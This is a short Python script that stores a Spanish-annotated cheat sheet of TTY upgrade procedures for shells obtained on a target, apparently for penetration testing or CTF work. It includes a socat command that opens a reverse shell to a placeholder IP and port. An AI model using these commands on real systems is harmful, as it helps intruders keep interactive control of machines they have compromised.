import pickle
TTY_PROCEDURES = {
    "python": {
        "name": "Python TTY upgrade",
        "description": "La mejor opcion si python se encuentra instalado",
        "commands": [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm-256color",
            "stty raw -echo",
            "fg"
        ],
        "notes": "Presiona ENTER despues de fg si la terminal perece congelada"
    },

    "script": {
        "name": "script command",
        "description": "Use script para spwanear una bash",
        "commands": [
            "script /dev/null -c bash",
            "export TERM=xterm-256color",
            "stty raw -echo",
            "fg"
        ],
        "notes": "Funciona bien cuando Python no esta instalado"
    },

    "sh_only": {
        "name": "Minimal /bin/sh upgrade",
        "description": "Cuando nada mas existe",
        "commands": [
            "stty raw -echo",
            "fg",
            "export TERM=xterm"
        ],
        "notes": "Limitado, pero permite Ctrl+C"
    },

    "socat": {
        "name": "Socat full TTY",
        "description": "PTY completa si Socat esta instalado",
        "commands": [
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>"
        ],
        "notes": "Requiere de listener en tu maquina"
    }
}

with open("tty_procedures.bin", "wb") as f:
    pickle.dump(TTY_PROCEDURES, f)

print("TTY procedures database created.")
